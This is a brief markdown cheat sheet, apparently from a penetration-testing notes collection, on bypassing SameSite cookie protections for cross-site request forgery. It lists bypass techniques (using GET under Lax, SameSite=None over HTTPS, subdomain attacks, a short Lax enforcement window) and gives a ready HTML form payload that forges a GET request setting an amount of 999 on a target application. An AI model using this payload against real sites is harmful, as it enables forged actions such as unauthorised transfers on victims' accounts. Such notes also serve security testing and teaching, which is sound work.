# SameSite Bypass

## Summary
Bypass SameSite cookie restrictions.

## Techniques
- SameSite=Lax bypass via GET method
- SameSite=None → requires Secure; still works on HTTPS
- Subdomain attacks if SameSite is not Strict
- 1-minute window for Lax enforcement

## Payloads
```html
<form action="https://app.com/action" method="GET">
  <input type="hidden" name="amount" value="999">
  <input type="submit">
</form>
```
